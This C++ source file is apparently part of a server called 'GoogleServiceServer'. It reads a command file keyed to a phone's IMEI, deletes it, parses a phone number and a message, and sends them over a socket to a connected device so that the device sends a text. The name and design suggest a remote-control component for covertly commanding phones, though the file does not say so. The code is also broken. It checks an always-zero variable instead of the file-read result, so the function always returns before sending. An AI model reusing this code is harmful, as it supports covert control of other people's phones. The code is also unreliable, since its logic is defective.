
#include <windows.h>
#include "GoogleServiceServer.h"
#include "PublicFunction.h"
#include "Additional.h"
#include "PacketMaker.h"
#include "Coder.h"
#include "CmdSendMessage.h"
#include "FileWriter.h"
#include "FileOperator.h"


DWORD SendPhoneMessage::GetPhoneAndMessage(char * src, char dst[2][MAX_MESSAGE_SIZE]) {
	char * phdr = strstr(src, "\r\n");
	if (phdr == 0)
	{
		return FALSE;
	}

	*phdr = 0;
	*(phdr + 1) = 0;
	if (lstrlenA(src) < MAX_MESSAGE_SIZE)
	{
		lstrcpyA(dst[0], src);
	}
	else {
		return FALSE;
	}


	phdr++;
	phdr++;

	if (lstrlenA(phdr) < MAX_MESSAGE_SIZE)
	{
		lstrcpyA(dst[1], phdr);
		if (memcmp(dst[1] + lstrlenA(dst[1]) - 2, "\r\n", 2) == 0)
		{
			*(dst[1] + lstrlenA(dst[1]) - 1) = 0;
		}
	}
	else {
		return FALSE;
	}

	return TRUE;
}

int SendPhoneMessage::CmdSendMessage(LPDATAPROCESS_PARAM  lpparam,char * imei,char * username,char * cmdfilename,int cmd){
	DATAPROCESS_PARAM stparam = * lpparam;
	char errorbuf[1024];

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, cmdfilename, imei);

	char szCmd[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szCmd, MAX_MESSAGE_SIZE);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	DeleteFileA(cmdfn.c_str());

	char sendmsgparam[2][MAX_MESSAGE_SIZE] = {0};
	iRet = GetPhoneAndMessage(szCmd,sendmsgparam);
	if (iRet)
	{
		char msgutf8[2][MAX_MESSAGE_SIZE] = { 0 };

		iRet = Coder::GBKFNToUTF8FN(sendmsgparam[0], msgutf8[0], MAX_MESSAGE_SIZE);
		iRet = Coder::GBKFNToUTF8FN(sendmsgparam[1], msgutf8[1], MAX_MESSAGE_SIZE);

		char szData[MAX_MESSAGE_SIZE*2];
		int iLen = PacketMaker::hdrWithStringString(szData, cmd, imei, msgutf8[0], msgutf8[1]);

		iRet =	send(stparam.sockclient,szData,iLen,0);
		if (iRet <= 0)
		{
			ErrorFormat(lpparam,errorbuf,"sendmessage send error",imei,username);
			WriteLogFile(errorbuf);
			return NETWORKERROR;
		}
		else
		{
			ErrorFormat(lpparam,errorbuf,"sendmessage send ok",imei,username);
			WriteLogFile(errorbuf);
			return TRUE;
		}
	}else{
		ErrorFormat(lpparam, errorbuf, "sendmessage GetPhoneAndMessage error", imei, username);
		WriteLogFile(errorbuf);
	}
	
	return FALSE;
}